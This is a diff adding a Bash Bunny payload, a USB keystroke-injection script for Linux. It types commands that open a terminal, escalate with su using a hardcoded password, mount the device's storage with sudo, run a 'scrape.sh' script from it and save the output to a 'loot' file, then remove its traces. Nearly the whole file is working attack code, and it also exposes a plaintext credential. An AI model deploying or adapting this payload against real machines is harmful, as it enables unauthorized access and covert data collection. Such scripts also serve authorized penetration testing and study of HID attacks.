@@ -1,0 +1,61 @@
+#!/bin/bash
+
+#red LED indicating the start of the script
+LED R
+
+#defining the bashbunny as storage and HID
+ATTACKMODE STORAGE HID 0xF000/0xFF02
+
+#opening the terminal
+Q ALT SPACE
+Q STRING terminal
+Q DELAY 1000
+Q ENTER
+Q DELAY 1000
+
+#getting sudo permissions
+Q STRING su
+Q ENTER
+Q STRING L1fe.1s.B1n0ry
+Q ENTER
+
+#grabbing the username
+Q STRING username=\$\(echo $USER\)
+Q ENTER
+
+#creating a mount for storage(bashbunny)
+Q STRING cd /media/\$username
+Q ENTER
+Q STRING sudo mkdir bashbunny
+Q ENTER
+
+#fetching device name of the storage(bashbunny) for mounting
+Q STRING temp=\$\(sudo fdisk -l \| grep 4194304\)
+Q ENTER
+Q STRING device_name=\$\(echo \$temp \| grep -oP '/dev/.*:' \| cut -c 6- \| rev \| cut -c 2- \| rev\)
+Q ENTER
+
+#mounting the storage(bashbunny)
+Q STRING sudo mount /dev/\$device_name bashbunny
+Q ENTER
+
+#running the script file from bashbunny
+Q STRING bash bashbunny/payloads/switch1/scrape.sh \>\> bashbunny/loot/output.txt
+Q ENTER
+
+#displaying the output
+Q STRING cat bashbunny/loot/output.txt
+Q ENTER
+
+#unmounting
+Q STRING sudo umount /dev/\$device_name
+Q ENTER
+Q STRING sudo rm -rf bashbunny
+Q ENTER
+
+#exiting directories
+Q STRING cd
+Q ENTER
+
+#green LED indicating the end of the script
+LED G
